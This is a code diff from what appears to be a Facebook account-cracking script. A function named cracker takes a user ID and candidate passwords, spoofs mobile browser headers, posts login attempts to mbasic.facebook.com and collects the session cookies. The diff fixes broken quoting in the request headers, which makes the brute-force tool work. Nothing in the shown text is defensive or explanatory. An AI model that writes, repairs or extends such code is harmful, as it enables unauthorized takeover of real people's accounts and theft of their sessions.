@@ -171,7 +171,7 @@ def cracker(uid,pwx,tl):
 				"login": "Masuk",
 				"bi_xrwh": "0"}
 			cookie = dict(ses.cookies.get_dict())
-			head = {"authority': 'mbasic.facebook.com',
+			head = {'host': 'mbasic.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
@@ -186,7 +186,7 @@ def cracker(uid,pwx,tl):
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5",
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
 }
 			xnxx = ses.post(f"https://mbasic.facebook.com{datax}", data=data, cookies=cookie, headers=head, allow_redirects=True)
 			fb_cookies=ses.cookies.get_dict().keys()
